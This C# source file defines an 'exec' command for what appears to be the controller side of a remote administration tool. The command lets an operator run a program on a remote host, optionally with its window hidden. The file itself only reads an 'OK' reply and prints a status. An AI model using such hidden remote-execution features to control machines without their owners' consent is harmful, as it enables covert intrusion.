using System;
using System.Collections.Generic;
using System.Diagnostics;
using Shared;

namespace ClientCommands
{
    internal class Execute : ICommand
    {
        public string name { get; set; } = "exec";

        public string description { get; set; } = "Execute a program on the remote host computer.\nArguments must be passed in double quotes.\nUse the 'hidden' keyword to hide the new process window.";

        public string syntaxHelper { get; set; } = "exec [remoteProgramPath] [\"arguments\"] [hidden]";

        public bool isLocal { get; set; } = false;

        public List<string> validArguments { get; set; } = new List<string>()
        {
            "? hidden",
            "? ? hidden",
            "?",
            "? ?"
        };


        public bool PreProcess(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void Process(List<string> args)
        {
            if (ClientCommandsManager.networkManager.ReadLine() == "OK")
            {
                ColorTools.WriteCommandSuccess("Program executed");
            }
            else
            {
                ColorTools.WriteCommandError("An error occured, maybe the specified file doesn't exist");
            }
        }
    }
}
